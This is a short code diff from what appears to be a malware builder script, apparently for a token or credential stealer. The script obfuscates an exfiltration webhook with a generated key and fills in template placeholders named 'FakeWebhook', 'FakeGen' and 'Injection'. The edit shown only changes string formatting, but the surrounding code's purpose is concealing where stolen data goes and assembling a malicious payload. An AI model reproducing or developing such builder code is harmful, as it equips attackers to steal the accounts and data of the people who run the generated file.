@@ -68,7 +68,7 @@ while True:
     custom_key = generate_key(key_length) 
 
     Webhook = obf(Webhook.encode(), custom_key)
-    new_content = content.replace("'%Webhook%'", str(Webhook)+','+str(custom_key))
+    new_content = content.replace("'%Webhook%'",f'''{str(Webhook)}'''+','+f'''{str(custom_key)}''')
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
     new_content = new_content.replace("'%Injection%'", str(Injection))
